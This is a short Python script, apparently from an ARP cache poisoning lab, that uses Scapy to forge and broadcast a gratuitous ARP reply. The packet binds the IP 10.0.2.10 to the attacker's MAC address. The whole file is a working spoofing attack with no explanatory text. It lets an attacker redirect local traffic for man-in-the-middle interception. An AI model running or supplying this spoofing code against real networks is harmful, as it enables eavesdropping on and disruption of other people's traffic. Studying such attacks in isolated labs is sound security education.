from scapy.all import *

A_IP = "10.0.2.12"
A_MAC = "00:0c:29:33:31:2e"
B_IP = "10.0.2.10"
M_MAC = "00:0c:29:b7:8f:c6"

packet = Ether(dst=ETHER_BROADCAST) / ARP(
    op=2, hwsrc=M_MAC, psrc=B_IP, hwdst=ETHER_BROADCAST, pdst=B_IP)

sendp(packet)